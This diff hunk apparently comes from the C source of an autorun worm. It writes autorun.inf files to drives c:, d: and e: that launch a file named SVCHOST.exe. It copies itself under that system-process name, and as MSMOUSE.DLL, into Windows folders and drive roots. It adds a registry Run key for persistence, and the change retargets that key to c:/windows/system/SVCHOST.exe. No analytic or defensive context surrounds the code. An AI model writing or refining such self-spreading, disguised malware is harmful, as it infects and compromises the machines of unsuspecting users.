@@ -35,7 +35,7 @@ int main(){
 	const char *autoRun = {"[autorun]\nopen=SVCHOST.exe\n\nshell\\1=打开\nshell\\1\\Command=SVCHOST.exe\nshell\\2\\=Open\nshell\\2\\Command=SVCHOST.exe\nshellexecute=SVCHOST.exe"};
 	const char *files_autorun[10] = {"c:\\autorun.inf", "d:\\autorun.inf", "e:\\autorun.inf"};
 	const char *files_svchost[SVCHOST_NUM+1] = {"c:\\windows\\system\\MSMOUSE.DLL", "c:\\windows\\system\\SVCHOST.exe", "c:\\windows\\SVCHOST.exe", "c:\\SVCHOST.exe", "d:\\SVCHOST.exe", "e:\\SVCHOST.exe", "SVCHOST.exe"};
-	const char *regadd = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SVCHOST /t REG_SZ /d SVCHOST.exe";
+	const char *regadd = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SVCHOST /t REG_SZ /d c:/windows/system/SVCHOST.exe";
 
 	FILE *input, *output;
 	for(int i = 0; i < 3; i++){
